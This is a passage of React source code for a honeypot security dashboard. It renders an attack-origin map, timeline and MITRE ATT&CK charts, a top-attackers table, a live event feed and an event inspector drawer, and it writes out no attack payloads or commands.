            className="h-8 px-2.5 rounded-[4px] bg-[#14171D] border border-[#2E3543] hover:border-[#8A93A2] text-xs font-mono text-[#F0F2F5] flex items-center gap-1.5 transition-colors"
          >
            <RotateCcw className="w-3 h-3" />
            Reset
          </button>
        )}
      </div>

      {/* Active Cross-Filter Chips */}
      {(mitreFilter || actorFilter || attackTypeFilter !== 'ALL' || severityFilter !== 'ALL') && (
        <div className="flex items-center gap-2 flex-wrap pt-1 border-t border-[#1E232C]/80">
          <span className="text-[10px] font-mono uppercase tracking-wider text-[#525B6A]">
            ACTIVE FILTERS:
          </span>
          {severityFilter !== 'ALL' && (
            <span className="inline-flex items-center gap-1.5 px-2 py-0.5 text-[11px] font-mono bg-[#14171D] border border-[#2E3543] rounded-[3px] text-[#F0F2F5]">
              SEV: {severityFilter}
              <button onClick={() => onSeverityChange('ALL')} className="text-[#8A93A2] hover:text-[#F0F2F5]">
                <X className="w-3 h-3" />
              </button>
            </span>
          )}
          {attackTypeFilter !== 'ALL' && (
            <span className="inline-flex items-center gap-1.5 px-2 py-0.5 text-[11px] font-mono bg-[#14171D] border border-[#2E3543] rounded-[3px] text-[#F0F2F5]">
              VECTOR: {attackTypeFilter}
              <button onClick={() => onAttackTypeChange('ALL')} className="text-[#8A93A2] hover:text-[#F0F2F5]">
                <X className="w-3 h-3" />
              </button>
            </span>
          )}
          {mitreFilter && (
            <span className="inline-flex items-center gap-1.5 px-2 py-0.5 text-[11px] font-mono bg-[#14171D] border border-[#E5A93C]/40 rounded-[3px] text-[#E5A93C]">
              MITRE: {mitreFilter}
              <button onClick={onClearMitre} className="hover:text-[#F0F2F5]">
                <X className="w-3 h-3" />
              </button>
            </span>
          )}
          {actorFilter && (
            <span className="inline-flex items-center gap-1.5 px-2 py-0.5 text-[11px] font-mono bg-[#14171D] border border-[#14B8A6]/40 rounded-[3px] text-[#14B8A6]">
              ACTOR: {actorFilter}
              <button onClick={onClearActor} className="hover:text-[#F0F2F5]">
                <X className="w-3 h-3" />
              </button>
            </span>
          )}
        </div>
      )}
    </div>
  );
}

// ============================================================================
// COMPONENT 5A: ATTACK MAP (Interactive Dark Vector Equirectangular SVG)
// ============================================================================

function AttackMap({ events, activeActor, onSelectActor }) {
  const [hoveredNode, setHoveredNode] = useState(null);

  const nodes = useMemo(() => {
    const map = new Map();
    for (const ev of events) {
      const existing = map.get(ev.ip);
      if (!existing) {
        map.set(ev.ip, {
          ip: ev.ip,
          country: ev.country,
          countryCode: ev.countryCode,
          city: ev.city,
          lat: ev.lat,
          lon: ev.lon,
          hits: 1,
          primaryVector: ev.attackType,
          maxSeverity: ev.severity,
        });
      } else {
        existing.hits += 1;
        if (SEVERITY_META[ev.severity].weight > SEVERITY_META[existing.maxSeverity].weight) {
          existing.maxSeverity = ev.severity;
        }
      }
    }
    return Array.from(map.values());
  }, [events]);

  const [targetX, targetY] = projectLonLat(HONEYPOT_NODE.lon, HONEYPOT_NODE.lat);

  return (
    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] flex flex-col overflow-hidden">
      <div className="px-4 py-2.5 border-b border-[#1E232C] flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Globe className="w-3.5 h-3.5 text-[#14B8A6]" />
          <h2 className="text-xs font-mono uppercase tracking-wider text-[#F0F2F5]">
            Global Threat Origin Telemetry
          </h2>
        </div>
        <div className="flex items-center gap-3 text-[11px] font-mono text-[#8A93A2]">
          <span className="flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-[#2EB872]" />
            SENSOR: {HONEYPOT_NODE.id}
          </span>
          <span className="hidden sm:inline text-[#525B6A] tabular-nums">
            {nodes.length} active origins
          </span>
        </div>
      </div>

      <div className="relative bg-[#08090B] flex-1 min-h-[260px] select-none">
        <svg
          viewBox="0 0 800 380"
          className="w-full h-full block"
          preserveAspectRatio="xMidYMid meet"
        >
          {/* Subtle Latitude / Longitude Graticule */}
          <g stroke="#14171D" strokeWidth="0.75">
            {[63, 126, 190, 253, 316].map((y) => (
              <line key={`lat-${y}`} x1="0" y1={y} x2="800" y2={y} strokeDasharray="2 4" />
            ))}
            {[100, 200, 300, 400, 500, 600, 700].map((x) => (
              <line key={`lon-${x}`} x1={x} y1="0" x2={x} y2="380" strokeDasharray="2 4" />
            ))}
          </g>

          {/* Continents Silhouette */}
          <g fill="#12151C" stroke="#1E232C" strokeWidth="1">
            {WORLD_CONTINENTS.map((d, idx) => (
              <path key={idx} d={d} />
            ))}
          </g>

          {/* Animated Attack Arcs */}
          <g fill="none">
            {nodes.map((node) => {
              const [sx, sy] = projectLonLat(node.lon, node.lat);
              const mx = (sx + targetX) / 2;
              const dist = Math.hypot(targetX - sx, targetY - sy);
              const my = Math.min(sy, targetY) - Math.min(85, dist * 0.25);
              const sevColor = SEVERITY_META[node.maxSeverity].color;
              const isSelected = activeActor === node.ip;

              return (
                <g key={`arc-${node.ip}`}>
                  {/* Base hairline path */}
                  <path
                    d={`M ${sx} ${sy} Q ${mx} ${my} ${targetX} ${targetY}`}
                    stroke={sevColor}
                    strokeOpacity={isSelected ? 0.85 : 0.22}
                    strokeWidth={isSelected ? 1.6 : 1}
                  />
                  {/* Animated telemetry packet dash */}
                  <path
                    d={`M ${sx} ${sy} Q ${mx} ${my} ${targetX} ${targetY}`}
                    stroke={sevColor}
                    strokeOpacity={0.85}
                    strokeWidth={isSelected ? 1.8 : 1.1}
                    strokeDasharray="6 140"
                    className="bottrap-arc-flow"
                  />
                </g>
              );
            })}
          </g>

          {/* Honeypot Destination Sensor Node */}
          <g transform={`translate(${targetX}, ${targetY})`}>
            <circle r="10" fill="#2EB872" fillOpacity="0.12" />
            <circle r="5.5" fill="none" stroke="#2EB872" strokeWidth="1" strokeDasharray="2 2" />
            <circle r="2.8" fill="#2EB872" />
          </g>

          {/* Source Actor Nodes */}
          {nodes.map((node) => {
            const [sx, sy] = projectLonLat(node.lon, node.lat);
            const sevColor = SEVERITY_META[node.maxSeverity].color;
            const radius = Math.min(7, 3 + Math.sqrt(node.hits) * 1.1);
            const isSelected = activeActor === node.ip;

            return (
              <g
                key={`node-${node.ip}`}
                transform={`translate(${sx}, ${sy})`}
                className="cursor-pointer"
                onMouseEnter={() => setHoveredNode({ ...node, x: sx, y: sy })}
                onMouseLeave={() => setHoveredNode(null)}
                onClick={() => onSelectActor(activeActor === node.ip ? null : node.ip)}
              >
                {isSelected && (
                  <circle r={radius + 5} fill="none" stroke="#F0F2F5" strokeWidth="1" />
                )}
                <circle r={radius + 3} fill={sevColor} fillOpacity="0.16" />
                <circle r={radius} fill={sevColor} stroke="#08090B" strokeWidth="1" />
              </g>
            );
          })}
        </svg>

        {/* Crisp Floating Tooltip */}
        {hoveredNode && (
          <div
            className="pointer-events-none absolute z-20 bg-[#0E1014] border border-[#2E3543] rounded-[4px] px-3 py-2 shadow-xl text-xs font-mono"
            style={{
              left: `${Math.min(72, Math.max(4, (hoveredNode.x / 800) * 100))}%`,
              top: `${Math.min(68, Math.max(6, (hoveredNode.y / 380) * 100))}%`,
            }}
          >
            <div className="flex items-center justify-between gap-4 mb-1">
              <span className="text-[#F0F2F5] font-semibold">{hoveredNode.ip}</span>
              <span
                className="text-[10px] px-1.5 py-0.2 rounded-[2px]"
                style={{
                  color: SEVERITY_META[hoveredNode.maxSeverity].color,
                  backgroundColor: SEVERITY_META[hoveredNode.maxSeverity].bg,
                }}
              >
                {hoveredNode.maxSeverity}
              </span>
            </div>
            <div className="text-[#8A93A2] text-[11px]">
              {hoveredNode.city}, {hoveredNode.country} ({hoveredNode.countryCode})
            </div>
            <div className="mt-1 pt-1 border-t border-[#1E232C] flex items-center justify-between gap-3 text-[11px]">
              <span className="text-[#8A93A2]">{hoveredNode.primaryVector}</span>
              <span className="text-[#F0F2F5] tabular-nums">{hoveredNode.hits} hits</span>
            </div>
            <div className="text-[10px] text-[#525B6A] mt-1">Click node to cross-filter</div>
          </div>
        )}
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT 5B: TIMELINE CHART (Interactive SVG Stacked Bar Chart)
// ============================================================================

function TimelineChart({ events }) {
  const [hoveredIdx, setHoveredIdx] = useState(null);

  const buckets = useMemo(() => {
    const bucketCount = 12;
    const now = Date.now();
    const spanMs = 30 * 60 * 1000; // 30 minutes
    const stepMs = spanMs / bucketCount;

    const list = Array.from({ length: bucketCount }, (_, i) => {
      const start = now - (bucketCount - i) * stepMs;
      const end = start + stepMs;
      const label = new Date(end).toTimeString().slice(0, 5);
      return { label, start, end, CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, total: 0 };
    });

    for (const ev of events) {
      const idx = Math.floor((ev.epoch - (now - spanMs)) / stepMs);
      const clamped = Math.max(0, Math.min(bucketCount - 1, idx));
      list[clamped][ev.severity] += 1;
      list[clamped].total += 1;
    }

    return list;
  }, [events]);

  const maxTotal = Math.max(4, ...buckets.map((b) => b.total));

  return (
    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] flex flex-col">
      <div className="px-4 py-2.5 border-b border-[#1E232C] flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Activity className="w-3.5 h-3.5 text-[#3B82F6]" />
          <h2 className="text-xs font-mono uppercase tracking-wider text-[#F0F2F5]">
            Attack Velocity (30m)
          </h2>
        </div>
        <div className="flex items-center gap-2.5 text-[10px] font-mono text-[#8A93A2]">
          {(['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']).map((s) => (
            <span key={s} className="flex items-center gap-1">
              <span
                className="w-1.5 h-1.5 rounded-[1px]"
                style={{ backgroundColor: SEVERITY_META[s].color }}
              />
              {s[0]}
            </span>
          ))}
        </div>
      </div>

      <div className="p-4 flex-1 flex flex-col justify-between relative min-h-[220px]">
        <div className="relative h-44 flex items-end gap-1.5 pt-4">
          {/* Horizontal reference gridlines */}
          <div className="absolute inset-0 flex flex-col justify-between pointer-events-none">
            {[maxTotal, Math.round(maxTotal / 2), 0].map((val, i) => (
              <div key={i} className="flex items-center gap-2 w-full">
                <span className="text-[10px] font-mono text-[#525B6A] w-5 text-right tabular-nums">
                  {val}
                </span>
                <div className="flex-1 border-t border-dashed border-[#1E232C]" />
              </div>
            ))}
          </div>

          {/* Bars */}
          <div className="relative z-10 flex-1 h-full flex items-end gap-1.5 pl-7">
            {buckets.map((b, idx) => {
              const isHover = hoveredIdx === idx;
              const hCrit = (b.CRITICAL / maxTotal) * 100;
              const hHigh = (b.HIGH / maxTotal) * 100;
              const hMed = (b.MEDIUM / maxTotal) * 100;
              const hLow = (b.LOW / maxTotal) * 100;

              return (
                <div
                  key={idx}
                  onMouseEnter={() => setHoveredIdx(idx)}
                  onMouseLeave={() => setHoveredIdx(null)}
                  className="flex-1 h-full flex flex-col justify-end items-center relative group cursor-crosshair"
                >
                  {isHover && (
                    <div className="absolute inset-y-0 w-px bg-[#2E3543] pointer-events-none" />
                  )}
                  <div className="w-full max-w-[22px] h-full flex flex-col justify-end gap-[1px]">
                    {b.CRITICAL > 0 && (
                      <div
                        style={{ height: `${hCrit}%`, backgroundColor: SEVERITY_META.CRITICAL.color }}
                        className="w-full rounded-t-[1px] transition-all"
                      />
                    )}
                    {b.HIGH > 0 && (
                      <div
                        style={{ height: `${hHigh}%`, backgroundColor: SEVERITY_META.HIGH.color }}
                        className="w-full transition-all"
                      />
                    )}
                    {b.MEDIUM > 0 && (
                      <div
                        style={{ height: `${hMed}%`, backgroundColor: SEVERITY_META.MEDIUM.color }}
                        className="w-full transition-all"
                      />
                    )}
                    {b.LOW > 0 && (
                      <div
                        style={{ height: `${hLow}%`, backgroundColor: SEVERITY_META.LOW.color }}
                        className="w-full rounded-b-[1px] transition-all"
                      />
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* X-Axis Labels */}
        <div className="pl-7 mt-2 flex justify-between text-[10px] font-mono text-[#525B6A] tabular-nums">
          <span>{buckets[0]?.label}</span>
          <span>{buckets[5]?.label}</span>
          <span>{buckets[11]?.label}</span>
        </div>

        {/* Hover Readout Strip */}
        {hoveredIdx !== null && buckets[hoveredIdx] && (
          <div className="absolute top-2 right-3 bg-[#14171D] border border-[#2E3543] rounded-[4px] px-2.5 py-1 text-[11px] font-mono flex items-center gap-2.5 tabular-nums shadow-lg">
            <span className="text-[#8A93A2]">{buckets[hoveredIdx].label}</span>
            <span className="text-[#F0F2F5] font-semibold">
              {buckets[hoveredIdx].total} ev
            </span>
            <span className="text-[#E5484D]">C:{buckets[hoveredIdx].CRITICAL}</span>
            <span className="text-[#F76B15]">H:{buckets[hoveredIdx].HIGH}</span>
            <span className="text-[#E5A93C]">M:{buckets[hoveredIdx].MEDIUM}</span>
            <span className="text-[#3B82F6]">L:{buckets[hoveredIdx].LOW}</span>
          </div>
        )}
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT 5C: ATTACK TYPE CHART (Interactive Horizontal Bar Cross-Filter)
// ============================================================================

function AttackTypeChart({ events, activeType, onSelectType }) {
  const rows = useMemo(() => {
    const counts = new Map();
    for (const ev of events) {
      counts.set(ev.attackType, (counts.get(ev.attackType) || 0) + 1);
    }
    const total = events.length || 1;
    return Array.from(counts.entries())
      .map(([type, count]) => ({
        type,
        count,
        pct: Math.round((count / total) * 100),
      }))
      .sort((a, b) => b.count - a.count);
  }, [events]);

  return (
    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] flex flex-col">
      <div className="px-4 py-2.5 border-b border-[#1E232C] flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Layers className="w-3.5 h-3.5 text-[#E5A93C]" />
          <h2 className="text-xs font-mono uppercase tracking-wider text-[#F0F2F5]">
            Attack Vectors
          </h2>
        </div>
        <span className="text-[10px] font-mono text-[#525B6A]">CLICK TO FILTER</span>
      </div>

      <div className="p-3.5 space-y-2.5">
        {rows.length === 0 ? (
          <div className="text-xs font-mono text-[#525B6A] py-6 text-center">
            No matching vectors
          </div>
        ) : (
          rows.map((row) => {
            const isSelected = activeType === row.type;
            return (
              <button
                key={row.type}
                onClick={() => onSelectType(isSelected ? 'ALL' : row.type)}
                className={`w-full text-left group p-1.5 -mx-1.5 rounded-[4px] transition-colors ${
                  isSelected ? 'bg-[#14171D]' : 'hover:bg-[#14171D]/60'
                }`}
              >
                <div className="flex items-center justify-between text-xs mb-1">
                  <span
                    className={`truncate pr-2 ${
                      isSelected ? 'text-[#F0F2F5] font-medium' : 'text-[#8A93A2] group-hover:text-[#F0F2F5]'
                    }`}
                  >
                    {row.type}
                  </span>
                  <span className="font-mono text-[11px] text-[#F0F2F5] tabular-nums shrink-0">
                    {row.count}{' '}
                    <span className="text-[#525B6A]">({row.pct}%)</span>
                  </span>
                </div>
                <div className="h-1.5 w-full bg-[#14171D] rounded-[2px] overflow-hidden border border-[#1E232C]">
                  <div
                    className="h-full transition-all duration-300"
                    style={{
                      width: `${Math.max(4, row.pct)}%`,
                      backgroundColor: isSelected ? '#14B8A6' : '#3B82F6',
                    }}
                  />
                </div>
              </button>
            );
          })
        )}
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT 5D: MITRE ATT&CK CHART (Interactive Cross-Filter)
// ============================================================================

function MitreChart({ events, activeMitre, onSelectMitre }) {
  const techniques = useMemo(() => {
    const map = new Map();
    for (const ev of events) {
      const existing = map.get(ev.mitreId);
      if (!existing) {
        map.set(ev.mitreId, {
          id: ev.mitreId,
          name: ev.mitreName,
          tactic: ev.mitreTactic,
          count: 1,
        });
      } else {
        existing.count += 1;
      }
    }
    return Array.from(map.values()).sort((a, b) => b.count - a.count);
  }, [events]);

  const maxCount = Math.max(1, ...techniques.map((t) => t.count));

  return (
    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] flex flex-col">
      <div className="px-4 py-2.5 border-b border-[#1E232C] flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Crosshair className="w-3.5 h-3.5 text-[#E5484D]" />
          <h2 className="text-xs font-mono uppercase tracking-wider text-[#F0F2F5]">
            MITRE ATT&CK Matrix
          </h2>
        </div>
        <span className="text-[10px] font-mono text-[#525B6A]">TECHNIQUE ID</span>
      </div>

      <div className="p-3.5 space-y-2">
        {techniques.length === 0 ? (
          <div className="text-xs font-mono text-[#525B6A] py-6 text-center">
            No MITRE techniques mapped
          </div>
        ) : (
          techniques.map((t) => {
            const isSelected = activeMitre === t.id;
            return (
              <button
                key={t.id}
                onClick={() => onSelectMitre(isSelected ? null : t.id)}
                className={`w-full text-left p-2 rounded-[4px] border transition-colors ${
                  isSelected
                    ? 'bg-[#14171D] border-[#E5A93C]/50'
                    : 'bg-[#08090B]/60 border-[#1E232C] hover:border-[#2E3543]'
                }`}
              >
                <div className="flex items-center justify-between gap-2 mb-1">
                  <div className="flex items-center gap-2 min-w-0">
                    <span className="font-mono text-[11px] font-semibold text-[#E5A93C] shrink-0">
                      {t.id}
                    </span>
                    <span className="text-xs text-[#F0F2F5] truncate">{t.name}</span>
                  </div>
                  <span className="font-mono text-xs text-[#F0F2F5] tabular-nums shrink-0">
                    {t.count}
                  </span>
                </div>
                <div className="flex items-center justify-between gap-2">
                  <span className="text-[10px] font-mono uppercase tracking-wider px-1.5 py-0.2 bg-[#14171D] border border-[#1E232C] rounded-[2px] text-[#8A93A2]">
                    {t.tactic}
                  </span>
                  <div className="w-24 h-1 bg-[#14171D] rounded-full overflow-hidden">
                    <div
                      className="h-full bg-[#E5A93C]"
                      style={{ width: `${Math.round((t.count / maxCount) * 100)}%` }}
                    />
                  </div>
                </div>
              </button>
            );
          })
        )}
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT 5E: TOP ATTACKERS (Dense Ranked Table)
// ============================================================================

function TopAttackers({ events, activeActor, onSelectActor }) {
  const actors = useMemo(() => {
    const map = new Map();
    for (const ev of events) {
      const curr = map.get(ev.ip);
      const sevScore = SEVERITY_META[ev.severity].weight * 18;
      if (!curr) {
        map.set(ev.ip, {
          ip: ev.ip,
          countryCode: ev.countryCode,
          asn: ev.asn,
          hits: 1,
          primaryVector: ev.attackType,
          score: Math.min(99, 25 + sevScore),
        });
      } else {
        curr.hits += 1;
        curr.score = Math.min(99, curr.score + Math.round(sevScore * 0.25));
      }
    }
    return Array.from(map.values())
      .sort((a, b) => b.hits - a.hits || b.score - a.score)
      .slice(0, 6);
  }, [events]);

  return (
    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] flex flex-col overflow-hidden">
      <div className="px-4 py-2.5 border-b border-[#1E232C] flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Server className="w-3.5 h-3.5 text-[#F76B15]" />
          <h2 className="text-xs font-mono uppercase tracking-wider text-[#F0F2F5]">
            Top Threat Actors
          </h2>
        </div>
        <span className="text-[10px] font-mono text-[#525B6A]">BY VOLUME</span>
      </div>

      <div className="overflow-x-auto">
        <table className="w-full text-left border-collapse">
          <thead>
            <tr className="border-b border-[#1E232C] text-[10px] font-mono uppercase tracking-wider text-[#525B6A] bg-[#08090B]/50">
              <th className="py-2 px-3">Source IP</th>
              <th className="py-2 px-2">Geo</th>
              <th className="py-2 px-2 text-right">Hits</th>
              <th className="py-2 px-3 text-right">Score</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-[#1E232C]/70 text-xs font-mono">
            {actors.map((a) => {
              const isSelected = activeActor === a.ip;
              const scoreColor =
                a.score >= 85 ? '#E5484D' : a.score >= 65 ? '#F76B15' : '#E5A93C';
              return (
                <tr
                  key={a.ip}
                  onClick={() => onSelectActor(isSelected ? null : a.ip)}
                  className={`cursor-pointer transition-colors ${
                    isSelected ? 'bg-[#14171D]' : 'hover:bg-[#14171D]/60'
                  }`}
                >
                  <td className="py-2 px-3">
                    <div className="text-[#F0F2F5] tabular-nums">{a.ip}</div>
                    <div className="text-[10px] text-[#525B6A] truncate max-w-[140px] font-sans">
                      {a.asn}
                    </div>
                  </td>
                  <td className="py-2 px-2 text-[#8A93A2]">{a.countryCode}</td>
                  <td className="py-2 px-2 text-right text-[#F0F2F5] tabular-nums">
                    {a.hits}
                  </td>
                  <td className="py-2 px-3">
                    <div className="flex items-center justify-end gap-2">
                      <div className="w-12 h-1.5 bg-[#14171D] rounded-[1px] overflow-hidden">
                        <div
                          className="h-full"
                          style={{ width: `${a.score}%`, backgroundColor: scoreColor }}
                        />
                      </div>
                      <span
                        className="tabular-nums text-[11px] w-5 text-right"
                        style={{ color: scoreColor }}
                      >
                        {a.score}
                      </span>
                    </div>
                  </td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT 6: LIVE FEED (High-Density Interactive Telemetry Log Table)
// ============================================================================

function LiveFeed({ events, selectedEventId, onInspectEvent }) {
  return (
    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] overflow-hidden">
      <div className="px-4 py-2.5 border-b border-[#1E232C] flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Terminal className="w-3.5 h-3.5 text-[#2EB872]" />
          <h2 className="text-xs font-mono uppercase tracking-wider text-[#F0F2F5]">
            Live Honeypot Event Stream
          </h2>
          <span className="text-[11px] font-mono text-[#525B6A] tabular-nums">
            ({events.length} records)
          </span>
        </div>
        <span className="text-[10px] font-mono text-[#525B6A] hidden sm:inline">
          SELECT ROW FOR PAYLOAD & AI TRIAGE
        </span>
      </div>

      <div className="overflow-x-auto max-h-[420px] overflow-y-auto">
        <table className="w-full text-left border-collapse min-w-[780px]">
          <thead className="sticky top-0 z-10 bg-[#08090B] border-b border-[#1E232C] text-[10px] font-mono uppercase tracking-wider text-[#525B6A]">
            <tr>
              <th className="py-2 px-4 w-24">Timestamp</th>
              <th className="py-2 px-3 w-24">Severity</th>
              <th className="py-2 px-3 w-36">Source IP</th>
              <th className="py-2 px-3 w-28">Geo</th>
              <th className="py-2 px-3">Attack Vector</th>
              <th className="py-2 px-3">Target Decoy</th>
              <th className="py-2 px-3 w-24">MITRE</th>
              <th className="py-2 px-4 w-24 text-right">Action</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-[#1E232C]/60 text-xs">
            {events.length === 0 ? (
              <tr>
                <td colSpan={8} className="py-10 text-center font-mono text-[#525B6A]">
                  No telemetry events match current filter criteria.
                </td>
              </tr>
            ) : (
              events.map((ev) => {
                const sev = SEVERITY_META[ev.severity];
                const isSelected = selectedEventId === ev.id;
                return (
                  <tr
                    key={ev.id}
                    onClick={() => onInspectEvent(ev)}
                    className={`cursor-pointer transition-colors relative ${
                      ev.isNew ? 'bottrap-new-row' : ''
                    } ${
                      isSelected
                        ? 'bg-[#14171D]'
                        : 'hover:bg-[#14171D]/70'
                    }`}
                    style={
                      ev.isNew
                        ? { boxShadow: `inset 2px 0 0 ${sev.color}` }
                        : isSelected
                        ? { boxShadow: 'inset 2px 0 0 #14B8A6' }
                        : undefined
                    }
                  >
                    <td className="py-2.5 px-4 font-mono text-[#8A93A2] tabular-nums whitespace-nowrap">
                      {formatTimeHMS(ev.timestamp)}
                    </td>
                    <td className="py-2.5 px-3 whitespace-nowrap">
                      <span
                        className="inline-flex items-center px-1.5 py-0.5 text-[10px] font-mono font-semibold rounded-[3px] border"
                        style={{
                          color: sev.color,
                          backgroundColor: sev.bg,
                          borderColor: sev.border,
                        }}
                      >
                        {sev.label}
                      </span>
                    </td>
                    <td className="py-2.5 px-3 font-mono text-[#F0F2F5] tabular-nums whitespace-nowrap">
                      {ev.ip}
                    </td>
                    <td className="py-2.5 px-3 font-mono text-[#8A93A2] whitespace-nowrap">
                      <span className="text-[#F0F2F5] mr-1">{ev.countryCode}</span>
                      <span className="text-[11px] text-[#525B6A]">{ev.city}</span>
                    </td>
                    <td className="py-2.5 px-3 text-[#F0F2F5] whitespace-nowrap">
                      {ev.attackType}
                    </td>
                    <td className="py-2.5 px-3 font-mono text-[#14B8A6] whitespace-nowrap">
                      {ev.targetPath}
                    </td>
                    <td className="py-2.5 px-3 font-mono text-[#E5A93C] whitespace-nowrap">
                      {ev.mitreId}
                    </td>
                    <td className="py-2.5 px-4 text-right whitespace-nowrap">
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          onInspectEvent(ev);
                        }}
                        className="inline-flex items-center gap-1 px-2 py-0.5 text-[11px] font-mono bg-[#08090B] hover:bg-[#1E232C] border border-[#1E232C] hover:border-[#2E3543] rounded-[3px] text-[#8A93A2] hover:text-[#F0F2F5] transition-colors"
                      >
                        Inspect
                        <ChevronRight className="w-3 h-3" />
                      </button>
                    </td>
                  </tr>
                );
              })
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT 7: EVENT DETAIL MODAL (Slide-Over Inspector Drawer)
// ============================================================================

function EventDetailModal({ event, onClose, onFilterByIp }) {
  const [copiedPayload, setCopiedPayload] = useState(false);
  const [copiedRule, setCopiedRule] = useState(false);

  useEffect(() => {
    setCopiedPayload(false);
    setCopiedRule(false);
  }, [event?.id]);

  useEffect(() => {
    const onKeyDown = (e) => {
      if (e.key === 'Escape') onClose();
    };
    window.addEventListener('keydown', onKeyDown);
    return () => window.removeEventListener('keydown', onKeyDown);
  }, [onClose]);

  if (!event) return null;

  const sev = SEVERITY_META[event.severity];

  const handleCopy = async (text, setter) => {
    try {
      await navigator.clipboard.writeText(text);
      setter(true);
      setTimeout(() => setter(false), 1800);
    } catch {
      // Fallback copy for restricted preview sandboxes
      const ta = document.createElement('textarea');
      ta.value = text;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
      setter(true);
      setTimeout(() => setter(false), 1800);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex justify-end">
      {/* Backdrop */}
      <div
        className="fixed inset-0 bg-black/65 transition-opacity"
        onClick={onClose}
      />

      {/* Slide-over Inspector Drawer */}
      <aside className="relative z-10 w-full max-w-xl bg-[#0E1014] border-l border-[#2E3543] h-full flex flex-col shadow-2xl bottrap-drawer-in">
        {/* Top Chromatic Hairline */}
        <div
          className="h-[1px] w-full shrink-0"
          style={{
            background:
              'linear-gradient(90deg, #3B82F6 0%, #14B8A6 33%, #E5A93C 66%, #E5484D 100%)',
          }}
        />

        {/* Drawer Header */}
        <div className="px-5 py-3.5 border-b border-[#1E232C] flex items-center justify-between gap-3 shrink-0">
          <div className="flex items-center gap-2.5 min-w-0">
            <span
              className="px-2 py-0.5 text-[10px] font-mono font-semibold rounded-[3px] border shrink-0"
              style={{
                color: sev.color,
                backgroundColor: sev.bg,
                borderColor: sev.border,
              }}
            >
              {sev.label}
            </span>
            <span className="font-mono text-xs text-[#F0F2F5] font-semibold truncate">
              {event.id} — {event.attackType}
            </span>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-[4px] text-[#8A93A2] hover:text-[#F0F2F5] hover:bg-[#14171D] transition-colors"
            aria-label="Close inspector"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Scrollable Content */}
        <div className="flex-1 overflow-y-auto p-5 space-y-5">
          {/* Metadata Grid */}
          <div>
            <div className="text-[10px] font-mono uppercase tracking-wider text-[#525B6A] mb-2">
              EVENT TELEMETRY METADATA
            </div>
            <div className="grid grid-cols-2 gap-px bg-[#1E232C] border border-[#1E232C] rounded-[4px] overflow-hidden">
              <div className="bg-[#08090B] p-2.5">
                <div className="text-[10px] font-mono text-[#525B6A]">SOURCE IP</div>
                <div className="mt-0.5 flex items-center justify-between gap-2">
                  <span className="font-mono text-xs text-[#F0F2F5] tabular-nums">
                    {event.ip}
                  </span>
                  <button
                    onClick={() => {
                      onFilterByIp(event.ip);
                      onClose();
                    }}
                    className="text-[10px] font-mono text-[#14B8A6] hover:underline"
                  >
                    Filter
                  </button>
                </div>
              </div>
              <div className="bg-[#08090B] p-2.5">
                <div className="text-[10px] font-mono text-[#525B6A]">GEOLOCATION</div>
                <div className="mt-0.5 font-mono text-xs text-[#F0F2F5]">
                  {event.city}, {event.country} ({event.countryCode})
                </div>
              </div>
              <div className="bg-[#08090B] p-2.5">
                <div className="text-[10px] font-mono text-[#525B6A]">ASN / NETWORK</div>
                <div className="mt-0.5 font-mono text-xs text-[#8A93A2] truncate">
                  {event.asn}
                </div>
              </div>
              <div className="bg-[#08090B] p-2.5">
                <div className="text-[10px] font-mono text-[#525B6A]">CAPTURED AT</div>
                <div className="mt-0.5 font-mono text-xs text-[#F0F2F5] tabular-nums">
                  {formatFullTimestamp(event.timestamp)}
                </div>
              </div>
              <div className="bg-[#08090B] p-2.5">
                <div className="text-[10px] font-mono text-[#525B6A]">TARGET / PORT</div>
                <div className="mt-0.5 font-mono text-xs text-[#14B8A6]">
                  {event.method} {event.targetPath} :{event.port}
                </div>
              </div>
              <div className="bg-[#08090B] p-2.5">
                <div className="text-[10px] font-mono text-[#525B6A]">RULE & MITRE</div>
                <div className="mt-0.5 flex items-center gap-2 font-mono text-xs">
                  <span className="text-[#8A93A2]">{event.ruleId}</span>
                  <a
                    href={`https://attack.mitre.org/techniques/${event.mitreId}/`}
                    target="_blank"
                    rel="noreferrer"
                    className="inline-flex items-center gap-0.5 px-1.5 py-0.2 bg-[#E5A93C]/10 border border-[#E5A93C]/30 rounded-[3px] text-[#E5A93C] hover:bg-[#E5A93C]/20"
                  >
                    {event.mitreId}
                    <ArrowUpRight className="w-3 h-3" />
                  </a>
                </div>
              </div>
            </div>
          </div>

          {/* Raw Payload & Request Viewer */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <span className="text-[10px] font-mono uppercase tracking-wider text-[#525B6A] flex items-center gap-1.5">
                <Terminal className="w-3 h-3 text-[#8A93A2]" />
                CAPTURED RAW REQUEST / PAYLOAD
              </span>
              <button
                onClick={() => handleCopy(event.rawRequest, setCopiedPayload)}
